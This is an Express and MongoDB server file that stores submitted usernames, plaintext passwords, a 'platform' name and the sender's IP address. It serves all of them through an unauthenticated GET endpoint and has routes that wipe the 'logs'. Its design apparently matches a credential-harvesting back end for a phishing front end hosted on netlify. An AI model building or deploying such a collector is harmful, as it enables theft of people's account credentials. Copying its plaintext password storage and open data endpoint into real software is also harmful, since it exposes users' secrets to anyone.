

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const app = express();

// Middleware

const allowedOrigins = ['http://localhost:8080', 'https://masterchefsct.netlify.app'];
app.use(cors({
    origin: allowedOrigins,
    credentials: true
}));

app.use(express.json());

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI)
  .then(() => console.log('✅ Connected to MongoDB Atlas'))
  .catch(err => console.error('❌ MongoDB connection error:', err));

// Schema
const loginSchema = new mongoose.Schema({
  platform: { type: String, required: true },
  username: { type: String, required: true },
  password: { type: String, required: true },
  timestamp: { type: Date, default: Date.now },
  ipAddress: { type: String }
});

const Login = mongoose.model('Login', loginSchema);

// Routes
app.post('/api/logins', async (req, res) => {
  try {
    const { platform, username, password } = req.body;
    const newLogin = new Login({
      platform,
      username,
      password,
      ipAddress: req.ip
    });
    await newLogin.save();
    res.status(201).json({ status: 'success', message: 'Login saved' });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

app.get('/api/logins', async (req, res) => {
  try {
    const logins = await Login.find().sort({ timestamp: -1 });
    res.json(logins);
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

app.delete('/api/logins', async (req, res) => {
  try {
    await Login.deleteMany({});
    res.json({ status: 'success', message: 'All logs cleared' });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Add this route to server.js if not present
app.delete('/api/logins/:id', async (req, res) => {
  try {
    await Login.findByIdAndDelete(req.params.id);
    res.json({ status: 'success', message: 'Record deleted' });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));